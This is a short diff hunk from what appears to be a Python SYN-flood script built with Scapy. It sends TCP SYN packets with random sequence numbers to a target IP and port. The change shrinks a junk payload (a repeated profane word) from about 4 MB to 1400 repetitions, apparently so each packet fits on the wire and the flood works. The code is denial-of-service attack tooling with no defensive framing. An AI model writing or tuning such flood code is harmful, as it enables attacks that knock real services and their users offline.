@@ -10,7 +10,7 @@ def generate_random_port():
     return random.randint(1024, 65535)
 
 def send_syn_packet(target_ip, target_port):
-    payload = Raw(load="fuck" * 1048576)
+    payload = Raw(load="fuck" * 1400)
     ip = IP(dst=target_ip)
     syn = TCP(dport=target_port, flags="S", seq=random.randint(1000, 9000))
     packet = ip/syn/payload
